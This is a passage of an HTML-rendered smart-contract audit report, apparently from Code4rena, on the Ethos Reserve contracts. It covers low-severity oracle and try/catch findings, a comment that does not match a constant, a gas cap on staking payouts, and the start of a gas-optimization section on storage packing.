data-index=\"73\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">data</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">getDataBefore</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_queryId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minutes</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>This should prevent the attack detailed in this <a href=\"https://www.liquity.org/blog/tellor-issue-and-fix\">Liquity Disclosure</a>, however, do note that you’ll have to constantly monitor the correctness of the feed and be able to react within 20 minutes to avoid the same attack from happening.</p>\n<p>Because the cost of the attack is fairly inexpensive (<code>$15</code> I believe), monitoring, as well as setting up infrastructure to dispute the incorrect price will be crucial.</p>\n<h3 id=\"81-l---the-tellor-price-may-leak-value\" style=\"position:relative;\"><a href=\"#81-l---the-tellor-price-may-leak-value\" aria-label=\"81 l   the tellor price may leak value permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>8.1. L - The Tellor price may leak value</h3>\n<p>Due to the 20 minute delay, the Tellor Price may end up offering too good of a redemption price during time in which the price tanks</p>\n<p>It may also prevent liquidations from happening correctly as the delay will make it so that some positions which should be liquidatable will be so only after the extra delay.</p>\n<h3 id=\"82-l---try-catch-can-still-revert-due-to-contract-check\" style=\"position:relative;\"><a href=\"#82-l---try-catch-can-still-revert-due-to-contract-check\" aria-label=\"82 l   try catch can still revert due to contract check permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>8.2. L - Try Catch can still revert due to contract check</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/PriceFeed.sol#L617-L636\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/PriceFeed.sol#L617-L636</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"74\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">try</span><span class=\"mtk1\"> </span><span class=\"mtk12\">priceAggregator</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">].</span><span class=\"mtk11\">getRoundData</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_currentRoundId</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">) </span><span class=\"mtk12\">returns</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint80</span><span class=\"mtk1\"> </span><span class=\"mtk12\">roundId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">int256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">answer</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk3\">/* startedAt */</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint80</span><span class=\"mtk1\"> </span><span class=\"mtk3\">/* answeredInRound */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// If call to Chainlink succeeds, return the response and success = true</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">prevChainlinkResponse</span><span class=\"mtk1\">.</span><span class=\"mtk12\">roundId</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">roundId</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">prevChainlinkResponse</span><span class=\"mtk1\">.</span><span class=\"mtk12\">answer</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">answer</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">prevChainlinkResponse</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">prevChainlinkResponse</span><span class=\"mtk1\">.</span><span class=\"mtk12\">decimals</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_currentDecimals</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">prevChainlinkResponse</span><span class=\"mtk1\">.</span><span class=\"mtk12\">success</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">prevChainlinkResponse</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">catch</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// If call to Chainlink aggregator reverts, return a zero response with success = false</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">prevChainlinkResponse</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span></code></pre>\n<p>If the aggregator doesn’t exist, Solidity will still revert in-spite of the try/catch</p>\n<h3 id=\"83-r---comment-different-from-constants\" style=\"position:relative;\"><a href=\"#83-r---comment-different-from-constants\" aria-label=\"83 r   comment different from constants permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>8.3. R - Comment different from constants</h3>\n<p>The code will check for 5% deviation, but the comment refers to 3%</p>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/PriceFeed.sol#L53-L54\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/PriceFeed.sol#L53-L54</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"75\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">MAX_PRICE_DIFFERENCE_BETWEEN_ORACLES</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">5e16</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// 5%</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/PriceFeed.sol#L496-L497\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/PriceFeed.sol#L496-L497</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"76\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        * </span><span class=\"mtk12\">Return</span><span class=\"mtk1\"> </span><span class=\"mtk4\">true</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> </span><span class=\"mtk12\">the</span><span class=\"mtk1\"> </span><span class=\"mtk12\">relative</span><span class=\"mtk1\"> </span><span class=\"mtk12\">price</span><span class=\"mtk1\"> </span><span class=\"mtk12\">difference</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk7\">3</span><span class=\"mtk1\">%: </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> </span><span class=\"mtk12\">so</span><span class=\"mtk1\">, </span><span class=\"mtk12\">we</span><span class=\"mtk1\"> </span><span class=\"mtk12\">assume</span><span class=\"mtk1\"> </span><span class=\"mtk12\">both</span><span class=\"mtk1\"> </span><span class=\"mtk12\">oracles</span><span class=\"mtk1\"> </span><span class=\"mtk12\">are</span><span class=\"mtk1\"> </span><span class=\"mtk12\">probably</span><span class=\"mtk1\"> </span><span class=\"mtk12\">reporting</span></span></span></code></pre>\n<h2 id=\"9-lqty-staking\" style=\"position:relative;\"><a href=\"#9-lqty-staking\" aria-label=\"9 lqty staking permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>9. LQTY Staking</h2>\n<h3 id=\"91-nc---gas-cap-at-around-400-collaterals\" style=\"position:relative;\"><a href=\"#91-nc---gas-cap-at-around-400-collaterals\" aria-label=\"91 nc   gas cap at around 400 collaterals permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>9.1. NC - Gas cap at around 400 collaterals</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/LQTY/LQTYStaking.sol#L238-L248\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/LQTY/LQTYStaking.sol#L238-L248</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"77\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_sendCollGainToUser</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">assets</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amounts</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">numCollaterals</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">assets</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">numCollaterals</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">amounts</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">] != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">assets</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">CollateralSent</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amounts</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amounts</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>The Sponsor mentioned a DOS, but ultimately the math will break at 400+ collaterals</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/672#issuecomment-1464147455\">Trust (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Excellent report</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/246#issuecomment-1476647830\">0xBebis (Ethos Reserve) confirmed</a></strong></p>\n<hr>\n<h1 id=\"gas-optimizations\" style=\"position:relative;\"><a href=\"#gas-optimizations\" aria-label=\"gas optimizations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gas Optimizations</h1>\n<p>For this contest, 58 reports were submitted by wardens detailing gas optimizations. The <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/835\">report highlighted below</a> by <strong>c3phas</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/838\">Deivitto</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/834\">0xsomeone</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/823\">ddimitrov22</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/753\">0xSmartContract</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/705\">cryptonue</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/651\">GalloDaSballo</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/600\">Tomio</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/584\">Budaghyan</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/576\">PaludoX0</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/571\">JCN</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/567\">abiih</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/555\">matrix_0wl</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/536\">atharvasama</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/530\">hl_</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/516\">0x6980</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/512\">0xackermann</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/456\">Rickard</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/451\">Rageur</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/450\">ReyAdmirado</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/397\">dharma09</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/393\">banky</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/383\">emmac002</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/382\">dec3ntraliz3d</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/378\">kaden</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/357\">descharre</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/355\">favelanky</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/352\">Rolezn</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/347\">Bough</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/339\">Viktor_Cortess</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/330\">RaymondFam</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/327\">codeislight</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/319\">Morraez</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/312\">P-384</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/260\">LethL</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/254\">hunter_w3b</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/249\">RHaO-sec</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/215\">Bnke0x0</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/212\">DeFiHackLabs</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/211\">0x3b</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/194\">kodyvim</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/191\">yamapyblack</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/186\">MiniGlome</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/178\">TheSavageTeddy</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/112\">Madalad</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/104\">Darshan</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/101\">Phantasmagoria</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/82\">0x73696d616f</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/80\">scokaf</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/72\">Saintcode_</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/53\">pavankv</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/40\">SaeedAlipoor01988</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/31\">seeu</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/26\">Sathish9098</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/17\">arialblack14</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/15\">oyc_109</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/4\">Praise</a>, and <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/3\">0xhacksmithh</a>.</em></p>\n<h2 id=\"summary-1\" style=\"position:relative;\"><a href=\"#summary-1\" aria-label=\"summary 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h2>\n<p>NB: Some functions have been truncated where necessary to just show affected parts of the code.</p>\n<p>Through out the report some places might be denoted with audit tags to show the actual place affected.</p>\n<h2 id=\"tightly-pack-storage-variablesoptimize-the-order-of-variable-declarationtotal-gas-saved-16k-gas\" style=\"position:relative;\"><a href=\"#tightly-pack-storage-variablesoptimize-the-order-of-variable-declarationtotal-gas-saved-16k-gas\" aria-label=\"tightly pack storage variablesoptimize the order of variable declarationtotal gas saved 16k gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tightly pack storage variables/optimize the order of variable declaration(Total Gas saved: 16K gas)</h2>\n<p>Here, the storage variables can be tightly packed by putting data type that can fit together next to each other.</p>\n<p>Some packing is only possible as the variables involved are timestamps and thus we can reduce their size from uint256 to uint64 safely</p>\n<h3 id=\"lusdtokensol-pack-bool-mintingpaused-with-address-trovemanageraddresssaves-1-slot-2k-gas\" style=\"position:relative;\"><a href=\"#lusdtokensol-pack-bool-mintingpaused-with-address-trovemanageraddresssaves-1-slot-2k-gas\" aria-label=\"lusdtokensol pack bool mintingpaused with address trovemanageraddresssaves 1 slot 2k gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>LUSDToken.sol: Pack bool mintingPaused with address troveManagerAddress(Saves 1 SLOT: 2k gas)</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/LUSDToken.sol#L37-L71\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/LUSDToken.sol#L37-L71</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"78\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LUSDToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">37</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span 